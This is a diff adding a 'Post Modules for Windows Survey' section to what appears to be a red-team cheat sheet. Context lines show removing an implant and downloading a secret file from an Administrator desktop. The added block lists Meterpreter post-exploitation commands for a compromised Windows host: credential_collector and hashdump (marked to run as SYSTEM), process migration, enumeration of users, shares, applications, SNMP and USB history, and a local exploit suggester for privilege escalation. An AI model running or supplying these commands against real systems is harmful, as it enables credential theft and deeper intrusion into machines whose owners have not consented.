@@ -114,3 +114,34 @@ del /path/to/implant #remove implant artifact from disk
 ````
 download C:\\Users\\Administrator\\Desktop\\secret.txt
 ````
+## Post Modules for Windows Survey 
+````
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/checkvm 
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/credentials/credential_collector 
+**ENSURE SYSTEM before running
+-----------------------------------------------------------------------
+**ENSURE you migrate to a user process before running dumplinks**
+meterpreter > run post/windows/manage/migrate 
+meterpreter > run post/windows/gather/dumplinks 
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/enum_applications 
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/enum_logged_on_users 
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/enum_shares 
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/enum_snmp
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/hashdump
+**ENSURE SYSTEM before running 
+-----------------------------------------------------------------------
+meterpreter > run post/windows/gather/usb_history 
+-----------------------------------------------------------------------
+msf > use post/multi/recon/local_exploit_suggester
+set SESSION X
+SHOWDESCRIPTION true
+-----------------------------------------------------------------------
+````
